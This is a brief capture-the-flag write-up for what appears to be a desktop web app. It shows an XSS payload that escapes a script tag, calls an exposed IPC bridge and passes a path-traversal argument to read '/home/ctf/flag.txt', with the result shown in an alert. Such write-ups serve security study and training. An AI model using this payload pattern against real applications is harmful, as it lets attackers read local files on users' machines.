## Writeup

1. Using XSS, user has to call the exposed IPC module.
2. Below is the payload for the same

```
 </script><script>top.window.api.receive('reply',(e=>{alert(`${e}`)})); top.window.api.sessionCheck('session','../../../../../../home/ctf/flag.txt');</script>

 ```